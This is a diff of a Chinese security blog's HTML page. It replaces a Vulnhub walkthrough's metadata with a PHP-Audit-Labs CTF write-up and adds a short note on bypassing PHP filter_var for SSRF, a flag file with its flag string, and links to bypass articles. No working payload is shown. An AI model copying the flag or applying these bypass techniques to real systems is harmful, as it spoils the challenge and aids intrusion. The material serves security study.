+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$flag = <span class="string">"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本题要构造以sec-redclub.com结尾，而且还要绕过filter_var，但是绕过之后，执行命令发现没有反应～～不晓得什么情况～</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwjbnin68lj30sl06zt8p.jpg" alt=""></p>
+<h4 id="Resources："><a href="#Resources：" class="headerlink" title="Resources："></a>Resources：</h4><p><a href="https://www.anquanke.com/post/id/101058#h2-4" target="_blank" rel="noopener">SSRF技巧之如何绕过filter_var( )</a></p>
+<p><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
 </the></excerpt>
       
     </div>
@@ -375,15 +368,15 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/Study/vulnhub-lampião.html">Vulnhub-Lampião：1 通关指南</a></p>
+        <p><span>Title:</span><a href="/Study/HR-audit.html">PHP-Audit-Labs 复现</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
-        <p><span class="post-count">Words:</span>975</p>
-        <p><span class="post-count">Time:</span>4 mins</p>
-        <p><span>Created:</span>2018-08-22, 18:39:24</p>
-        <p><span>Updated:</span>2018-10-12, 00:41:29</p>
+        <p><span class="post-count">Words:</span>1,139</p>
+        <p><span class="post-count">Time:</span>5 mins</p>
+        <p><span>Created:</span>2018-10-22, 16:33:08</p>
+        <p><span>Updated:</span>2018-11-03, 12:03:42</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/Study/vulnhub-lampião.html" title="Vulnhub-Lampião：1 通关指南">http://blog.0akarma.me/Study/vulnhub-lampião.html</a>
-            <span class="copy-path" data-clipboard-text="From http://blog.0akarma.me/Study/vulnhub-lampião.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/Study/HR-audit.html" title="PHP-Audit-Labs 复现">http://blog.0akarma.me/Study/HR-audit.html</a>
+            <span class="copy-path" data-clipboard-text="From http://blog.0akarma.me/Study/HR-audit.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -396,15 +389,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/Study/amateur-ops-ctfd.html">
-                    Act as an Amateur OPS in D0g3-CTFd
+                <a href="/Study/SSRF.html">
+                    Server-Side Request Forgery In Code Audit
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/Study/vulnhub-lazySysAdmin.html">
-                    Vulnhub-LazySysAdmin 通关指南
+                <a href="/Study/ArbFileUpload.html">
+                    Arbitrary File Upload In Code Audit
                 </a>
             </div>
         
@@ -441,7 +434,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Durpal"><span class="toc-text">Durpal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH爆破"><span class="toc-text">SSH爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-1-Wish-List"><span class="toc-text">Day 1 Wish List</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array"><span class="toc-text">in_array()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#课后练习–SQL-Injection"><span class="toc-text">课后练习–SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#in-array-1"><span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resources"><span class="toc-text">Resources:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Day-2-Twig"><span class="toc-text">Day 2 Twig</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig模版引擎"><span class="toc-text">Twig模版引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter-var"><span class="toc-text">filter_var()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#课后练习–SSRF"><span class="toc-text">课后练习–SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Resources："><span class="toc-text">Resources：</span></a></li></ol></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -506,7 +499,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/Study/amateur-ops-ctfd.html" title="Pre: Act as an Amateur OPS in D0g3-CTFd">
+            <a href="/Study/SSRF.html" title="Pre: Server-Side Request Forgery In Code Audit">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -514,7 +507,7 @@
         <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/Study/vulnhub-lazySysAdmin.html" title="Next: Vulnhub-LazySysAdmin 通关指南">
+            <a href="/Study/ArbFileUpload.html" title="Next: Arbitrary File Upload In Code Audit">
                 <i class="fa fa-angle-right"></i>
             </a>
         
